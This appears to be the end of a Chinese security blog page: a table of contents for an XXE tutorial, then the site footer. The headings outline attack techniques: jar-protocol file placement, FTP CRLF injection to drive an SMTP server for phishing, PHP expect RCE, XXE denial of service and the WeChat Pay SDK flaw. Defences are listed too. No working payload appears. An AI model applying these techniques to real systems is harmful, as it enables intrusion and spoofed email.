class="nav-item nav-level-5"><a class="nav-link" href="#可以清楚地看到我的请求是向自己本地的-9999-端口发出的，那么9999-端口上有什么服务呢？实际上是我自己用-python-写的一个-TCP-服务器"><span class="nav-number">1.80.9.</span> <span class="nav-text">可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码：-9"><span class="nav-number">1.81.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sever-py"><span class="nav-number">1.81.1.</span> <span class="nav-text">sever.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个-sleep-30-，这个的目的我后面再说"><span class="nav-number">1.81.2.</span> <span class="nav-text">这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#既然是文件上传，那我们又要回到-jar-协议解析文件的过程中了"><span class="nav-number">1.81.3.</span> <span class="nav-text">既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的"><span class="nav-number">1.81.4.</span> <span class="nav-text">那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-php-在这个-jar-zip-中没有的话，java-解析器就会报错，说在这个临时文件中找不到这个文件"><span class="nav-number">1.81.5.</span> <span class="nav-text">1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如下图："><span class="nav-number">1.81.6.</span> <span class="nav-text">如下图：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep-）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用-hex-编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题"><span class="nav-number">1.81.7.</span> <span class="nav-text">既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面是我的实验录屏："><span class="nav-number">1.81.8.</span> <span class="nav-text">下面是我的实验录屏：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实验就到这一步了，怎么利用就看各位大佬的了（坏笑）"><span class="nav-number">1.81.9.</span> <span class="nav-text">实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在LCTF-2018-出了这样一个CTF题目，详细的-wp-可以看这篇文章"><span class="nav-number">1.81.10.</span> <span class="nav-text">在LCTF 2018 出了这样一个CTF题目，详细的 wp 可以看这篇文章</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验七：钓鱼："><span class="nav-number">1.82.</span> <span class="nav-text">实验七：钓鱼：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#如果内网有一台易受攻击的-SMTP-服务器，我们就能利用-ftp-协议结合-CRLF-注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb-的一篇文章-）"><span class="nav-number">1.82.1.</span> <span class="nav-text">如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Java支持在sun-net-ftp-impl-FtpClient中的ftp-URI。因此，我们可以指定用户名和密码，例如ftp-user-password-host-port-test-txt，FTP客户端将在连接中发送相应的USER命令。"><span class="nav-number">1.82.2.</span> <span class="nav-text">Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是如果我们将-0D-0A-CRLF-添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令："><span class="nav-number">1.82.3.</span> <span class="nav-text">但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-10"><span class="nav-number">1.82.4.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM-com上的邮件服务器："><span class="nav-number">1.82.5.</span> <span class="nav-text">当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-11"><span class="nav-number">1.82.6.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。"><span class="nav-number">1.82.7.</span> <span class="nav-text">这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验八：其他："><span class="nav-number">1.83.</span> <span class="nav-text">实验八：其他：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下："><span class="nav-number">1.83.1.</span> <span class="nav-text">除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-PHP-expect-RCE"><span class="nav-number">1.84.</span> <span class="nav-text">1.PHP expect RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#由于-PHP-的-expect-并不是默认安装扩展，如果安装了这个expect-扩展我们就能直接利用-XXE-进行-RCE"><span class="nav-number">1.84.1.</span> <span class="nav-text">由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-12"><span class="nav-number">1.84.2.</span> <span class="nav-text">示例代码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-利用-XXE-进行-DOS-攻击"><span class="nav-number">1.85.</span> <span class="nav-text">2. 利用 XXE 进行 DOS 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-13"><span class="nav-number">1.85.1.</span> <span class="nav-text">示例代码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#五、真实的-XXE-出现在哪"><span class="nav-number">1.86.</span> <span class="nav-text">五、真实的 XXE 出现在哪</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方"><span class="nav-number">1.86.1.</span> <span class="nav-text">我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如今的-web-时代，是一个前后端分离的时代，有人说-MVC-就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端-api-只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以-json-格式返回给前端，前端只负责坐享其成，拿到数据json-decode-就行了（这里的后端可以是后台代码，也可以是外部的api-接口，这里的前端可以是传统意义的前端，也可以是后台代码）"><span class="nav-number">1.86.2.</span> <span class="nav-text">如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那么问题经常就出现在-api-接口能解析客户端传过来的-xml-代码，并且直接外部实体的引用，比如下面这个"><span class="nav-number">1.86.3.</span> <span class="nav-text">那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例一：模拟情况"><span class="nav-number">1.87.</span> <span class="nav-text">实例一：模拟情况</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-14"><span class="nav-number">1.87.1.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们发出-带有-xml-的-POST-请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：-“Request-Successful”-“Added-”"><span class="nav-number">1.87.2.</span> <span class="nav-text">我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是如果我们传入一个恶意的代码"><span class="nav-number">1.87.3.</span> <span class="nav-text">但是如果我们传入一个恶意的代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果没有做好“安全措施”-就会出现解析恶意代码的情况，就会有下面的返回"><span class="nav-number">1.87.4.</span> <span class="nav-text">如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例二：微信支付的-XXE"><span class="nav-number">1.88.</span> <span class="nav-text">实例二：微信支付的 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#前一阵子非常火的微信支付的-XXE-漏洞当然不得不提，"><span class="nav-number">1.88.1.</span> <span class="nav-text">前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞描述："><span class="nav-number">1.88.2.</span> <span class="nav-text">漏洞描述：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#微信支付提供了一个-api-接口，供商家接收异步支付结果，微信支付所用的java-sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads-获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据-md5-key-and-merchant-Id-etc-，他可能通过发送伪造的信息不用花钱就购买商家任意物品"><span class="nav-number">1.88.3.</span> <span class="nav-text">微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我下载了-java-版本的-sdk-进行分析，这个-sdk-提供了一个-WXPayUtil-工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中"><span class="nav-number">1.88.4.</span> <span class="nav-text">我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如图所示：-3"><span class="nav-number">1.88.5.</span> <span class="nav-text">如图所示：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#问题就出现在我横线划出来的那部分，也就是简化为下面的代码："><span class="nav-number">1.88.6.</span> <span class="nav-text">问题就出现在我横线划出来的那部分，也就是简化为下面的代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以看到-当构建了-documentBuilder-以后就直接对传进来的-strXML-解析了，而不巧的是-strXML-是一处攻击者可控的参数，于是就出现了-XXE-漏洞，下面是我实验的步骤"><span class="nav-number">1.88.7.</span> <span class="nav-text">我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#首先我在-com-包下又新建了一个包，来写我们的测试代码，测试代码我命名为-test001-java"><span class="nav-number">1.88.8.</span> <span class="nav-text">首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如图所示：-4"><span class="nav-number">1.88.9.</span> <span class="nav-text">如图所示：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#test001-java"><span class="nav-number">1.88.10.</span> <span class="nav-text">test001.java</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我希望它能读取我-D-盘下面的-1-txt-文件"><span class="nav-number">1.88.11.</span> <span class="nav-text">我希望它能读取我 D 盘下面的 1.txt 文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运行后成功读取"><span class="nav-number">1.88.12.</span> <span class="nav-text">运行后成功读取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如图所示：-5"><span class="nav-number">1.88.13.</span> <span class="nav-text">如图所示：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当然，WXPayXmlUtil-java-中有这个-sdk-的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的"><span class="nav-number">1.88.14.</span> <span class="nav-text">当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受："><span class="nav-number">1.88.15.</span> <span class="nav-text">整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#链接：https-pan-baidu-com-s-1YbCO2cZpzZS1mWd7Mes4Qw-提取码：xq1b"><span class="nav-number">1.88.16.</span> <span class="nav-text">链接：https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw 提取码：xq1b</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如图所示：-6"><span class="nav-number">1.88.17.</span> <span class="nav-text">如图所示：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例三：JSON-content-type-XXE"><span class="nav-number">1.89.</span> <span class="nav-text">实例三：JSON content-type XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击"><span class="nav-number">1.89.1.</span> <span class="nav-text">正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#原始请求和响应："><span class="nav-number">1.89.2.</span> <span class="nav-text">原始请求和响应：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Request"><span class="nav-number">1.89.3.</span> <span class="nav-text">HTTP Request:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Response"><span class="nav-number">1.89.4.</span> <span class="nav-text">HTTP Response:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在我们尝试将-Content-Type-修改为-application-xml"><span class="nav-number">1.89.5.</span> <span class="nav-text">现在我们尝试将 Content-Type 修改为 application/xml</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#进一步请求和响应："><span class="nav-number">1.90.</span> <span class="nav-text">进一步请求和响应：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Request-1"><span class="nav-number">1.90.1.</span> <span class="nav-text">HTTP Request:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Response-1"><span class="nav-number">1.90.2.</span> <span class="nav-text">HTTP Response:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以发现服务器端是能处理-xml-数据的，于是我们就可以利用这个来进行攻击"><span class="nav-number">1.90.3.</span> <span class="nav-text">可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最终的请求和响应："><span class="nav-number">1.90.4.</span> <span class="nav-text">最终的请求和响应：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Request-2"><span class="nav-number">1.90.5.</span> <span class="nav-text">HTTP Request:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Http-Response"><span class="nav-number">1.90.6.</span> <span class="nav-text">Http Response:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#六、XXE-如何防御"><span class="nav-number">1.91.</span> <span class="nav-text">六、XXE 如何防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方案一：使用语言中推荐的禁用外部实体的方法"><span class="nav-number">1.91.1.</span> <span class="nav-text">方案一：使用语言中推荐的禁用外部实体的方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP："><span class="nav-number">1.91.2.</span> <span class="nav-text">PHP：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JAVA"><span class="nav-number">1.91.3.</span> <span class="nav-text">JAVA:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#python"><span class="nav-number">1.91.4.</span> <span class="nav-text">python:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方案二：手动黑名单过滤-不推荐"><span class="nav-number">1.92.</span> <span class="nav-text">方案二：手动黑名单过滤(不推荐)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤关键词："><span class="nav-number">1.92.1.</span> <span class="nav-text">过滤关键词：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#七、总结"><span class="nav-number">1.93.</span> <span class="nav-text">七、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#对-XXE-漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于-netdoc-的利用和-jar-协议的利用，这个-jar-协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。"><span class="nav-number">1.93.1.</span> <span class="nav-text">对 XXE 漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于 netdoc 的利用和 jar 协议的利用，这个 jar 协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你的知识面，决定着你的攻击面。"><span class="nav-number">1.93.2.</span> <span class="nav-text">你的知识面，决定着你的攻击面。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考："><span class="nav-number">1.94.</span> <span class="nav-text">参考：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#https-depthsecurity-com-blog-exploitation-xml-external-entity-xxe-injection"><span class="nav-number">1.94.1.</span> <span class="nav-text">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-column-156863-html"><span class="nav-number">1.94.2.</span> <span class="nav-text">http://www.freebuf.com/column/156863.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-vuls-154415-html"><span class="nav-number">1.94.3.</span> <span class="nav-text">http://www.freebuf.com/vuls/154415.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-xz-aliyun-com-t-2426"><span class="nav-number">1.94.4.</span> <span class="nav-text">https://xz.aliyun.com/t/2426</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-articles-web-177979-html"><span class="nav-number">1.94.5.</span> <span class="nav-text">http://www.freebuf.com/articles/web/177979.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-articles-web-126788-html"><span class="nav-number">1.94.6.</span> <span class="nav-text">http://www.freebuf.com/articles/web/126788.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-anquanke-com-post-id-86075"><span class="nav-number">1.94.7.</span> <span class="nav-text">https://www.anquanke.com/post/id/86075</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-blog-nsfocus-net-xml-dtd-xxe"><span class="nav-number">1.94.8.</span> <span class="nav-text">http://blog.nsfocus.net/xml-dtd-xxe/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-vuls-176837-html"><span class="nav-number">1.94.9.</span> <span class="nav-text">http://www.freebuf.com/vuls/176837.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-xz-aliyun-com-t-2448"><span class="nav-number">1.94.10.</span> <span class="nav-text">https://xz.aliyun.com/t/2448</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-freebuf-com-articles-web-97833-html"><span class="nav-number">1.94.11.</span> <span class="nav-text">http://www.freebuf.com/articles/web/97833.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-xz-aliyun-com-t-2249"><span class="nav-number">1.94.12.</span> <span class="nav-text">https://xz.aliyun.com/t/2249</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-secpulse-com-archives-6256-html"><span class="nav-number">1.94.13.</span> <span class="nav-text">https://www.secpulse.com/archives/6256.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-blog-netspi-com-playing-content-type-xxe-json-endpoints"><span class="nav-number">1.94.14.</span> <span class="nav-text">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-xz-aliyun-com-t-122"><span class="nav-number">1.94.15.</span> <span class="nav-text">https://xz.aliyun.com/t/122</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-shiftordie-de-blog-2017-02-18-smtp-over-xxe"><span class="nav-number">1.94.16.</span> <span class="nav-text">https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-blog-csdn-net-u012991692-article-details-80866826"><span class="nav-number">1.94.17.</span> <span class="nav-text">https://blog.csdn.net/u012991692/article/details/80866826</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-web-in-security-blogspot-com-2016-03-xxe-cheat-sheet-html"><span class="nav-number">1.94.18.</span> <span class="nav-text">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</span></a></li></ol></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">115.8k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
